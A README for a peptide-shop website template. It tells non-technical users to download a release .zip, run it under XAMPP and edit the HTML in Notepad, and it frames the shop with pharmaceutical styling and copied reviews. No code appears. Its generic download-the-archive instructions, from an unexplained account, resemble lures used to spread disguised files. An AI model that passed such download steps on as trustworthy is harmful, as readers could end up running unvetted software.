# 🧬 CMS-Peptides-template - Professional e-commerce site for research peptides

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Riccasporting805/CMS-Peptides-template/releases)

This repository provides a complete website template for peptide research businesses. It features a clean, professional design that emphasizes trust and clarity. You can use this template to showcase product catalogs, display certificates of analysis, and manage customer reviews. The internal shopping cart tracks items using your browser storage to ensure a smooth transition for your visitors.

## 📥 Downloading the software

Visit [this page to download](https://github.com/Riccasporting805/CMS-Peptides-template/releases) the most recent version of the website files.

1. Navigate to the link above.
2. Look for the Assets section on the page.
3. Click the file ending in `.zip` to start the download.
4. Save the folder to your computer.

## ⚙️ System Requirements

Your computer needs a local web server to display this template correctly. XAMPP is the standard tool for this task on Windows.

- Operating System: Windows 10 or Windows 11.
- Web Server: XAMPP (Apache).
- Storage: 100 MB of disk space.
- Browser: Google Chrome, Mozilla Firefox, or Microsoft Edge.

## 🛠️ Setting up the environment

Before you view your website, you must install the server software.

1. Go to the Apache Friends website.
2. Download the installer for XAMPP for Windows.
3. Run the installer and follow the prompts. Select the default options. 
4. Open the XAMPP Control Panel from your Start menu.
5. Find the Apache row and click the Start button.
6. A green indicator means your local web server runs.

## 📂 Installing the template

Now move the website files to your server so you can view them.

1. Open the `.zip` file you downloaded earlier.
2. Extract the contents of the folder.
3. Navigate to your computer's C: drive.
4. Open the folder named `xampp`.
5. Open the folder named `htdocs`.
6. Create a new folder inside `htdocs` named `peptides`.
7. Move all the files from your extracted folder into this `peptides` folder.

## 🌐 Opening the website

You can now view your site in your web browser.

1. Open your web browser.
2. Type `localhost/peptides` into the address bar.
3. Press Enter.
4. The website template appears on your screen.

## 🛒 Using the features

This template includes built-in tools for your customers.

### Product Catalog
The main page displays your available items. Each item includes a description, price, and a link to its specific certificate of analysis. You can edit these details in the `index.html` file using any text editor like Notepad.

### Certificates of Analysis (COA)
Each product includes a table for batch numbers and purity data. This transparency helps build confidence with your researchers.

### Shopping Cart
The cart remains active while you browse. It stores selected items in your browser. If you refresh the page or close the tab, the cart items remain waiting for you.

## 📝 Customizing your site

You do not need to be a developer to change the text and images.

1. Go to your `C:\xampp\htdocs\peptides` folder.
2. Right-click any file ending in `.html`.
3. Select Open With and then choose Notepad or any simple text editor.
4. Locate the text you want to change.
5. Type your new information over the existing text.
6. Save the file and refresh your browser page to see the updates.

## 🛡️ Trustpilot Reviews
The template contains a section dedicated to customer feedback. You can copy your recent reviews into this section to show social proof. Keep the design minimalist to maintain the pharmaceutical aesthetic.

## ❓ Frequently Asked Questions

### Do I need internet access?
No. You run this website locally on your computer. You only need internet access to download the files and the XAMPP software.

### Can I change the colors?
Yes. Open the `style.css` file in your project folder. Look for lines that mention background colors or main accent colors. Change the hex codes to match your branding.

### Why do I see a blank page?
Check the XAMPP Control Panel. Ensure the Apache module shows a green background. If it says Stopped, click Start. Refresh your browser page afterward.

### Can I add more items?
Yes. Copy the structure of an existing product in the `index.html` file. Paste it below the existing product block. Update the name, price, and COA details to reflect your new product.

### Is my data secure?
Because this runs on your local machine, your data stays on your hard drive. No external database stores your information unless you add one later. Using local storage keeps the setup simple for small research catalogs.